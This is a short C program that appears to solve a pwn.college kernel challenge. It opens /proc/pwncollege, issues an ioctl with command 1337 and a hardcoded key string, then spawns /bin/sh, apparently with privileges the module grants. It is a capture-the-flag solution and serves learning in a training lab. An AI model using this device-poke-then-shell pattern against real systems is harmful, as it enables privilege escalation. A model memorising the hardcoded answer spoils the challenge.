#include<stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include<assert.h>
int main(){

    int fd ;
    char ans[] = "nsmomceghyawjfnr";
    char buffer[] = "0";
    fd = open("/proc/pwncollege",2);
    assert(fd >0);
    ioctl(fd,1337,"nsmomceghyawjfnr");
    //write(fd,ans,sizeof(ans));
    //read(fd,buffer,100);
    //printf("%s",buffer);

    execl("/bin/sh","/bin/sh",0);
    return 0 ;
}